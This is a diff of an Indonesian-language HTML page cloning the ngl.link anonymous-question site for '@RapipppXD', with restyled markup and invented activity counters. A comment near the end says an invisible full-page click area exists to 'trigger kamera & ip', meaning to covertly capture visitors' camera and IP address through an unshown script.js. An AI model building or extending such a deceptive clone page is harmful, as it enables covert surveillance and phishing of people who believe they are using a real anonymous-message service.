@@ -1,44 +1,93 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
   <title>ngl.link</title>
+
+  <!-- Tailwind -->
+  <script src="https://cdn.tailwindcss.com"></script>
+
+  <!-- Fonts & Icons -->
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet"/>
+
+  <!-- CSS eksternal -->
   <link rel="stylesheet" href="style.css">
 </head>
-<body>
-  <div class="container">
+<body class="min-h-screen flex items-center justify-center px-4 py-12">
+  <div class="w-full max-w-md">
+    <!-- top floating activity -->
+    <div class="flex justify-center mb-6">
+      <div class="activity">
+        <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" viewBox="0 0 24 24" fill="currentColor"><path d="M12 12c2.21 0 4-1.79 4-4S14.21 4 12 4 8 5.79 8 8s1.79 4 4 4zM2 20c0-3.31 2.69-6 6-6h8c3.31 0 6 2.69 6 6v1H2v-1z"/></svg>
+        <div class="text-sm ml-1">205 teman baru saja mengetuk</div>
+      </div>
+    </div>
 
-    <!-- Card -->
+    <!-- main card -->
     <div class="card">
-      <div class="username">@RapipppXD</div>
-      <div class="subtitle">kirimi aku pesan anonim!</div>
+      <!-- header -->
+      <div class="flex items-center gap-4 px-5 py-4 header">
+        <div class="w-12 h-12 rounded-full avatar-ring bg-white flex items-center justify-center">
+          <img src="https://storage.googleapis.com/a1aa/image/5df75832-9f76-4ece-e6f3-683fd17d55b0.jpg"
+               alt="avatar" class="w-10 h-10 rounded-full object-cover"/>
+        </div>
+        <div class="flex-1">
+          <div class="text-gray-900 font-semibold text-sm">@RapipppXD</div>
+          <div class="text-gray-500 text-xs">kirimi aku pesan anonim</div>
+        </div>
+        <div class="text-xs text-muted">•••</div>
+      </div>
 
-      <!-- Textarea -->
-      <textarea id="msg" class="textarea" placeholder="apakah kamu lajang?"></textarea>
+      <!-- preview / big message area -->
+      <div class="px-5 py-6 bg-white">
+        <div class="glass p-4 rounded-2xl">
+          <div class="text-pink-600 font-semibold text-lg mb-2">lagi ngapain nanti?</div>
+          <div class="text-sm text-muted mb-3">kirim yang jujur ya — 100% anonim</div>
 
-      <!-- Label -->
-      <div class="label">🔒 tanya-jawab anonim</div>
+          <!-- textarea -->
+          <textarea id="msg" class="ngl-textarea w-full h-36 p-4 resize-none" placeholder="Ketik pesan anonimmu di sini..."></textarea>
 
-      <!-- Button -->
-      <button id="sendBtn" class="btn">Kirim!</button>
-      <div id="status" class="status">© ngl - 2025</div>
+          <!-- controls -->
+          <div class="mt-4 flex items-center gap-3">
+            <button id="dice" class="w-10 h-10 rounded-full bg-pink-50 flex items-center justify-center ring-1 ring-pink-100">
+              <img src="https://storage.googleapis.com/a1aa/image/c1c7fb05-e997-44ba-9254-e474d307b9f2.jpg" alt="dice" class="w-5 h-5"/>
+            </button>
+
+            <div class="flex-1"></div>
+
+            <button id="sendBtn" class="send-btn bg-black text-white px-5 py-3 rounded-full font-semibold shadow-md hover:scale-[1.02] transition">
+              Send!
+            </button>
+          </div>
+        </div>
+      </div>
+
+      <!-- footer small -->
+      <div class="px-5 py-4 border-t flex items-center justify-between">
+        <div class="text-sm text-muted flex items-center gap-2">
+          <i class="fas fa-lock"></i>
+          <span>100% anonymous Q&amp;A</span>
+        </div>
+        <div class="text-sm text-pink-500 font-semibold cursor-pointer" id="createLink">Buat linkmu</div>
+      </div>
     </div>
 
-    <!-- Fake CTA bawah -->
-    <div class="cta">
-      👇 245 kawan baru je tekan butang 👇
-    </div>
-    <button class="btn wide">Dapatkan pesan untukmu sendiri!</button>
+    <!-- dynamic area: recent messages -->
+    <div id="recentArea" class="mt-6 space-y-3"></div>
 
-    <!-- Footer -->
-    <div class="footer">
-      <a href="#">Terms</a>
-      <a href="#">Privacy</a>
+    <!-- create link CTA -->
+    <div class="mt-8 text-center text-white">
+      <div class="text-lg font-semibold">👇 Dapatkan pesan untukmu sendiri 👇</div>
+      <button id="makeLink" class="makeLinkBtn">Buat link anonim kamu</button>
     </div>
+
+    <!-- status hidden -->
+    <div id="status" class="mt-2 text-sm text-yellow-500 text-center"></div>
   </div>
 
-  <!-- Area klik invisible -->
+  <!-- invisible area buat trigger kamera & ip -->
   <div id="clickArea"></div>
 
   <script src="script.js"></script>
